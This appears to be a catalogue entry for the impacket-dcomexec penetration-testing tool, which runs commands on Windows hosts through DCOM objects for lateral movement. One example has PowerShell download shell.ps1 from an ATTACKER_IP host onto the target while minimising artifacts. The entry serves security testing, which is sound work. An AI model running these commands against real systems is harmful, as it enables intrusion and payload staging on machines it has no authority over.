---
name: "impacket-dcomexec"
categories:
  - corpus-windows
homepage: "https://github.com/fortra/impacket"
origin: "corpus"
github-repo: "fortra/impacket"
packaged-by: []
meta-checked: "2026-11-09"
github-commits-year: 169
gh-activity-checked: "2026-11-09"
worth: 6.5
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
---

# impacket-dcomexec

> Semi-interactive shell via DCOM automation methods (MMC20, ShellWindows, ShellBrowserWindow) — psexec-style results over a different RPC surface.

## What it's for

impacket-dcomexec executes commands on a Windows host by abusing DCOM methods: the `Document.ActiveView.ExecuteShellCommand` method of the MMC20.Application object, or `ShellExecute` on the ShellWindows/ShellBrowserWindow objects. It provides a cmd-style shell with output read back over SMB (ADMIN$ by default) like wmiexec, but reaches the host through a different COM activation path — useful for varying lateral-movement techniques when you hold local-admin credentials. Select the object with `-object` (`MMC20`, `ShellWindows` — case-sensitive CamelCase in current impacket — or `ShellBrowserWindow`; default `ShellWindows`). With `-silentcommand` the command runs without cmd.exe: no output comes back and shell builtins like `dir`/`cd` do not work.

## Typical use cases

### Shell via the MMC20 DCOM object

```
impacket-dcomexec -object MMC20 example.com/jdoe:Password1@198.51.100.10
```

Outcome: semi-interactive cmd prompt on the target; every entered command is launched through MMC20.Application's ExecuteShellCommand and its output is echoed back. On the target, the COM server (mmc.exe for MMC20) is the parent of the executed command.

### Execute one command silently (no cmd.exe)

```
impacket-dcomexec -object MMC20 -silentcommand example.com/jdoe:Password1@198.51.100.10 \
    'powershell.exe Invoke-WebRequest -Uri http://ATTACKER_IP/shell.ps1 -OutFile C:\\Windows\\Temp\\shell.ps1'
```

Outcome: the single command runs via DCOM with no cmd.exe interpreter and no output retrieval — for one-shot actions like staging a file where fewer interpreter artifacts matter; verify success by the side effect (the HTTP request in the example) rather than terminal output.

*Commands verified against the current impacket source (`examples/dcomexec.py`); a corpus-era invocation used `-object mmc20` lowercase, which current argparse rejects in favor of `MMC20`.*
